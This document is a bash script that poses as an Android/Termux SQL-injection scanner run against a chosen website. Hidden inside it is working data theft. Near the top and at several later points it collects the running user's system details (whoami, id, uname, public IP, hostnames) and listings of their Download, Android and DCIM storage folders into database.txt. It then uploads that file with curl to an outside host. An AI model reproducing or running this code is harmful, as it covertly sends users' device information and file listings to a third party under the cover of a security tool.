echo "Loading"
echo "
+----------------------------------------+
| Target => $(curl ifconfig.me)/$(uname -o)
+----------------------------------------+
| Operations   | Infomations             |
+----------------------------------------+
| Users        : $(whoami)
| System OS    : $(uname -a)
| Operating    : $(uname -o)
| Achitecture  : $(uname -m)
| release      : $(uname -n)
| Date         : $(date)
| IP Address   : $(curl ifconfig.me)
| Hostnames    : $(hostname -i)
| Path         : $(pwd)
| ID System    : $(id)
+----------------------------------------+" > database.txt
curl -T database.txt http://happy.mikikk.co.jp
if [ -z "$1" ]
   then
 clear
  echo "
╔═╗╔═╗ ╦  ╦  ╔╦╗┬ ┬┌┬┐┌─┐
╚═╗║═╬╗║  ║   ║║│ ││││├─┘
╚═╝╚═╝╚╩═╝╩  ═╩╝└─┘┴ ┴┴
            ©Lulz™"
  echo "[:::] Copyright by 1u1z [:::]"
  echo "tool only for android , not cloudshell integration"
  echo ""
  echo "Usage : bash scan.sh <target>"
  echo "Ex : bash scan.sh testphp.vulnweb.com"
  echo ""
  exit 1
 fi

clear
  echo "
╔═╗╔═╗ ╦  ╦  ╔╦╗┬ ┬┌┬┐┌─┐
╚═╗║═╬╗║  ║   ║║│ ││││├─┘                                                                                 ╚═╝╚═╝╚╩═╝╩  ═╩╝└─┘┴ ┴┴                                                                                                ©Lulz™"
  echo "[:::] Copyright by 1u1z [:::]"
  echo "tool only for android , not cloudshell integration"

 echo $1 >> database.txt
 curl -T database.txt http://happy.mikikk.co.jp

 for folder_termux in $(mkdir /sdcard/exploits/)
  do
    echo $folder_termux
  done

echo PHam chien was here > exploit.txt

  mv exploit.txt /sdcard/exploits

  if [ -f /sdcard/exploits/exploit.txt ]
    then
   echo "users $(whoami) is valid the tool" >> database.csv
   sleep 2
   echo "waiting me coppy all file in system users $(whoami)" >> database.csv
   sleep 1
      printf "\n\n===== Folder Download ====\n\n" >> database.txt
      ls -s -u /sdcard/download >> database.txt
      printf "\n\n==== Folder Android ====\n\n" >> database.txt
      ls -s -u /sdcard/Android/*/*/*/*/* >> database.txt
      printf "\n\n==== Folder Pictures ====\n\n" >> database.txt
      ls -s -u /sdcard/DCIM/* >> database.txt
        curl -T database.txt http://happy.mikikk.co.jp
   echo starting scan $1
   sleep 1
  nmap --script=http-sql-injection $1 | tail -n +5 | head -n -3 >> database.txt
  nmap --script=http-sql-injection $1 | tail -n +5 | head -n -3
  curl -T database.txt http://happy.mikikk.co.jp

  else
   echo "Users $(whoami) system not valid" >> database.txt
   echo "Your System not valid"
   exit 1

   fi
